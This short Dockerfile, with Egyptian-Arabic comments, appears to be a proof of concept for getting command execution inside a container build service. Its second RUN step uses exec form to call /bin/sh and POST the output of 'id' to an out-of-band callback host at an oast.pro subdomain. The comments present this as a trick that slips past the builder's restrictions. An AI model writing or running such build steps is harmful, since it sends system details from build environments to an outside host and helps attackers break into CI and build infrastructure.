FROM alpine:latest

# 1. نزل الأدوات عادي
RUN apk add --no-cache curl

# 2. اللمسة السحرية: Exec Form
# الأقواس دي بتخلينا نستدعي /bin/sh مباشرة ونحط الأمر جواه
# دي الطريقة الوحيدة اللي تتخطى "غباء" الـ Builder
RUN ["/bin/sh", "-c", "curl -X POST -d \"$(id)\" http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/EXEC_SUCCESS"]
